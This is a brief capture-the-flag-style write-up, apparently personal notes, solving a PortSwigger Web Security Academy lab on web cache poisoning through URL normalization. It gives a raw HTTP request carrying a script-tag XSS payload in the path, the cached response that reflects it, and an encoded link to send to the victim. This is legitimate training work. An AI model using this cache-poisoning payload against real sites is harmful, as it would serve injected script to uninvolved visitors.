# Lab

https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization

## Payload

```http	
GET /<script>alert(1)</script> HTTP/2
Host: 0a0e0058049470b383975bf700b500c4.web-security-academy.net
Cookie: session=eXCSch0AXeavBfZ4xgZWLOql4hxFIN1p
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```

## Answer

```
HTTP/2 404 Not Found
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=10
Age: 1
X-Cache: hit
Content-Length: 44

<p>Not Found: /<script>alert(1)</script></p>
```

Envoyer le lien : `https://0a0e0058049470b383975bf700b500c4.web-security-academy.net/%3Cscript%3Ealert(1)%3C/script%3E`